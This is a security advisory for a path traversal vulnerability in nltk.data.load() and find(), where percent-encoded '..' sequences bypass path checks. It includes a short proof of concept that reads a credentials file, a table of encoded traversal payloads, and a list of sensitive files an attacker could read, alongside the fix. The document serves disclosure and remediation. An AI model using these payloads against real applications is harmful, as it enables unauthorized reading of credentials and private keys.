# [H] nltk: Arbitrary File Read via Path Traversal in nltk.data.load() through Percent-Encoded Sequences

## Summary
Severity: High
Advisory: GHSA-m42h-3232-vpv3
CVE: CVE-2026-12243
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-08-13
Source: https://github.com/advisories/GHSA-m42h-3232-vpv3
Type: github-advisory

## Affected
- PyPI: `nltk` — affected >=0 <3.10.0

## Details
# Summary
nltk.data.load() and nltk.data.find() resolve user-supplied resource names to filesystem paths using url2pathname(), which decodes percent-encoded sequences (e.g. %2e%2e to ..). Path safety checks are performed on the raw, still-encoded string before decoding occurs. An attacker supplying %2e%2e instead of .. bypasses all path validation and reads arbitrary files outside the NLTK data directory.

# Vulnerable Code
nltk/data.py - find() function:
 url2pathname() decodes %2e%2e -> .. AFTER any safety check
p = os.path.join(path_, url2pathname(resource_name))
if os.path.exists(p):
    return FileSystemPathPointer(p)

# Proof of Concept
import nltk.data
nltk.data.path = ["/home/user/nltk_data"]
%2e%2e decodes to .. via url2pathname(), escaping the data dir
data = nltk.data.load("%2e%2e/SECRET_credentials.txt", format="raw")
print(data)
 b'AWS_SECRET_KEY=AKIAIOSFODNN7EXAMPLE\nDATABASE_PASS=hunter2\n'
All of these bypass path checks and decode identically:

# Payload	After url2pathname()
%2e%2e/secret	../secret
.%2e/secret	../secret
%2e./secret	../secret
%2E%2E/secret	../secret
Root Cause
url2pathname() is called after path safety checks, not before. Encoding .. as %2e%2e passes every check, then decodes to a traversal sequence at filesystem access time.

# Fix
Decode before checking:

from urllib.parse import unquote
resource_name = unquote(resource_name)  # decode first, then validate

# Impact
An attacker who controls the resource name passed to nltk.data.load() can read any file the process has permission to access - credentials, environment files, SSH private keys, /etc/passwd, /proc/self/environ, application config files, etc. This affects any application that passes user-controlled input to nltk.data.load() or nltk.data.find().

## References
- https://github.com/nltk/nltk/security/advisories/GHSA-m42h-3232-vpv3
- https://nvd.nist.gov/vuln/detail/CVE-2026-12243
- https://github.com/nltk/nltk/issues/3504
- https://github.com/nltk/nltk/pull/3522
- https://github.com/nltk/nltk/commit/aec4fce1b84ad725b8975f7365b23a4f626572a9
- https://github.com/nltk/nltk
- https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-597.yaml
- https://huntr.com/bounties/39aa9354-54ca-4e77-96da-580eb1fe6ed1
- https://securityinfinity.com/research/path-traversal-in-nltks-nltk-data-load-via-percent-encoded-sequences
